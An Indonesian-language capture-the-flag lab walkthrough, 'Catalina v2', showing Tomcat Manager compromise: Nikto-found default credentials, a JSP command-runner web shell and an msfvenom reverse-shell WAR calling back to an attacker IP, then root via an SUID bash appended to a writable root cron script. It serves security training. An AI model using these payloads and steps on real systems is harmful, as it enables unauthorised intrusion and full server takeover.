# 01 — Pembahasan Detail Lab Catalina v2
## Tomcat Manager → Deploy WAR → RCE Tomcat → Writable Root Cron → Root

> Target pembaca: peserta baru yang belum tahu dari mana credential Tomcat ditemukan dan bagaimana alur sampai flag.

---

## 1. Gambaran Besar

Lab Catalina adalah contoh eksploitasi **Apache Tomcat Manager** yang terbuka dengan credential lemah.

Alur lengkap:

```text
Recon port 8081
→ cek /manager/html
→ endpoint mengembalikan 401 Tomcat Manager
→ scan Nikto menemukan default credential tomcat:s3cret
→ validasi credential ke /manager/text/list
→ deploy WAR
→ RCE sebagai user tomcat
→ cek cron root
→ temukan /opt/backup/backup.sh writable oleh group tomcat
→ tambahkan payload rootbash
→ cron menjalankan payload sebagai root
→ /tmp/rootbash -p
→ cari flag
→ baca /root/FLAG.txt
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.122` |
| Web | `http://192.168.56.122:8081` |
| Service | Apache Tomcat |
| Credential ditemukan | `tomcat:s3cret` |
| Cara menemukan credential | `nikto -h "$WEB"` |
| User awal | `tomcat` |
| Cron root | `/etc/cron.d/backup` |
| Script rentan | `/opt/backup/backup.sh` |
| Root shell | `/tmp/rootbash -p` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |
| Flag lab | `/root/FLAG.txt` |

---

## 3. Fase 1 — Menemukan Service Tomcat

### Tujuan

Mengetahui apakah target menjalankan Tomcat dan pada port berapa.

### Command

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"

nmap -Pn -sC -sV -p8081 "$TARGET"
```

### Output yang Diharapkan

```text
8081/tcp open  http
Apache Tomcat
```

### Makna Output

Port `8081` terbuka dan service terindikasi Tomcat. Langkah berikutnya adalah mengecek apakah Tomcat Manager tersedia.

---

## 4. Fase 2 — Mengecek Tomcat Manager

### Command

```bash
curl -i "$WEB/manager/html"
```

### Output yang Diharapkan

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

### Makna Output

`401` berarti endpoint ada, tetapi butuh autentikasi. Ini adalah evidence bahwa Tomcat Manager aktif.

> Kesalahan umum peserta baru: menganggap `401` sebagai kegagalan. Untuk recon, `401` justru bukti bahwa endpoint tersedia.

---

## 5. Fase 3 — Menemukan Credential dengan Nikto

### Tujuan

Mencari indikasi default credential atau konfigurasi lemah pada Tomcat.

### Command

```bash
nikto -h "$WEB"
```

### Output Evidence

Pada lab, Nikto memberikan temuan seperti:

```text
/manager/html: Default account found
ID 'tomcat', PW 's3cret'
```

### Makna Output

Nikto menemukan credential default/lemah:

```text
Username : tomcat
Password : s3cret
```

Ini belum cukup untuk exploit. Credential harus divalidasi.

---

## 6. Fase 4 — Validasi Credential Tomcat Manager

### Command

```bash
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/list"
```

### Output yang Diharapkan

```text
OK - Listed applications for virtual host [localhost]
```

### Makna Output

`OK` membuktikan:
- credential valid;
- user dapat mengakses Tomcat Manager text interface;
- jalur deploy WAR bisa digunakan.

### Validasi Tambahan Opsional

```bash
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/serverinfo"
```

Output dapat berisi informasi server, Java, dan OS. Untuk ujian, cukup `manager/text/list` menghasilkan `OK`.

---

# 7. Fase 5A — Foothold Opsi A: JSP Command Runner Manual

Opsi ini paling mudah dipahami karena tidak membutuhkan listener.

## 7.1 Buat JSP Command Runner

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();
    byte[] b = new byte[4096];
    int n;
    out.println("<pre>");
    while ((n = in.read(b)) != -1) out.write(new String(b,0,n));
    while ((n = err.read(b)) != -1) out.write(new String(b,0,n));
    out.println("</pre>");
}
%>
EOF
```

### Penjelasan

JSP menerima parameter `cmd` dari URL, lalu menjalankan command melalui:

```text
/bin/sh -c <cmd>
```

Contoh nanti:

```text
cmd=id
cmd=whoami
```

## 7.2 Package Menjadi WAR

```bash
zip -r labcmd.war cmd.jsp
```

### Output

```text
  adding: cmd.jsp
```

## 7.3 Deploy WAR

```bash
curl \
  -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$WEB/manager/text/deploy?path=/labcmd&update=true"
```

### Output

```text
OK - Deployed application at context path [/labcmd]
```

## 7.4 Validasi RCE

```bash
SHELL_URL="$WEB/labcmd/cmd.jsp"

curl -sG \
  --data-urlencode "cmd=id; whoami; hostname; pwd" \
  "$SHELL_URL"
```

### Output Evidence

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat
catalina
/
```

### Makna Output

Kita sudah mendapatkan command execution sebagai user `tomcat`.

---

# 8. Fase 5B — Foothold Opsi B: msfvenom Reverse Shell

Opsi ini memberikan shell interaktif.

## 8.1 Tentukan IP Attacker

```bash
ip -br a
```

Contoh IP attacker pada lab:

```text
192.168.56.116
```

## 8.2 Buat WAR Reverse Shell

```bash
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom
cd ~/tomcat-lab/msfvenom

msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$ATTACKER_IP" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

### Output yang Diharapkan

```text
Payload size: ...
Final size of war file: ...
Saved as: catalina-shell.war
```

## 8.3 Deploy WAR

```bash
curl \
  -u tomcat:s3cret \
  --upload-file catalina-shell.war \
  "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
```

### Output

```text
OK - Deployed application at context path [/catalina-shell]
```

## 8.4 Buka Listener

```bash
nc -lvnp 4444
```

Output:

```text
listening on [any] 4444 ...
```

## 8.5 Trigger Reverse Shell

Terminal lain:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Jika belum masuk:

```bash
unzip -l catalina-shell.war | grep -E '\.jsp$'
curl -s "$WEB/catalina-shell/NAMA_FILE.jsp" >/dev/null
```

## 8.6 Output Evidence dari Lab

```text
connect to [192.168.56.116] from (UNKNOWN) [192.168.56.122] 42426
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
whoami
tomcat
hostname
catalina
pwd
/
```

---

## 9. Fase 6 — Enumerasi Lokal: Cron Root

### Tujuan

Mencari proses otomatis root yang bisa kita pengaruhi.

### Command

```bash
cat /etc/cron.d/backup 2>/dev/null
```

### Output Evidence

```text
* * * * * root /opt/backup/backup.sh
```

### Makna Output

Setiap menit, root menjalankan:

```text
/opt/backup/backup.sh
```

Langkah berikutnya adalah mengecek apakah script tersebut bisa ditulis oleh user `tomcat`.

---

## 10. Fase 7 — Cek Permission Script

### Command

```bash
ls -lah /opt/backup/backup.sh
stat -c '%A %U %G %n' /opt/backup/backup.sh
cat /opt/backup/backup.sh
```

### Output Evidence dari Lab

```text
-rwxrwxr-x 1 root tomcat 79 Jul 15 06:58 /opt/backup/backup.sh
-rwxrwxr-x root tomcat /opt/backup/backup.sh
#!/bin/bash
# backup task
```

Pada sesi sebelumnya juga terlihat isi script pernah berisi:

```text
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

### Makna Permission

```text
Owner root   : rwx
Group tomcat : rwx
Other        : r-x
```

Karena shell kita adalah `tomcat`, dan group `tomcat` punya izin tulis, kita bisa menambahkan perintah ke script yang dijalankan root.

---

## 11. Fase 8 — Membuat SUID Rootbash

### Command

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
ls -l /tmp/rootbash
```

### Output Evidence

```text
-rwsr-xr-x 1 root root 1396520 Jul 15 07:24 /tmp/rootbash
```

### Makna Output

`-rwsr-xr-x` berarti SUID aktif. File dimiliki root. Ketika dijalankan dengan `-p`, bash mempertahankan effective UID root.

---

## 12. Fase 9 — Masuk Root

### Command

```bash
/tmp/rootbash -p
whoami
id
```

### Output Evidence

```text
root
uid=997(tomcat) gid=997(tomcat) euid=0(root) groups=997(tomcat)
```

### Penjelasan

Walaupun `uid` asli masih `tomcat`, `euid=0(root)` berarti proses memiliki hak efektif root.

---

## 13. Fase 10 — Cari dan Baca Flag

### Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Evidence

```text
/root/FLAG.txt
```

### Baca Flag

```bash
cat /root/FLAG.txt
```

### Output Final

```text
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

## 14. Kesalahan Umum Catalina

| Masalah | Penyebab | Solusi |
|---|---|---|
| `/manager/html` 401 | Endpoint ada tapi butuh login | Lanjut cari credential |
| Nikto tidak langsung terlihat credential | Output panjang | Cari kata `Default account found` |
| Reverse shell tidak masuk | LHOST salah/listener belum aktif | Cek `ip -br a`, jalankan `nc` dulu |
| `/tmp/rootbash` belum muncul | Cron belum jalan | Tunggu `sleep 70` |
| Rootbash tidak root | Menjalankan tanpa `-p` | Gunakan `/tmp/rootbash -p` |

---

## 15. Alur Hafalan Catalina

```text
nmap 8081
curl /manager/html → 401
nikto → tomcat:s3cret
curl manager/text/list → OK
deploy WAR
id → tomcat
cat /etc/cron.d/backup
stat backup.sh → root tomcat rwx
append rootbash
sleep 70
/tmp/rootbash -p
find flag
cat /root/FLAG.txt
```
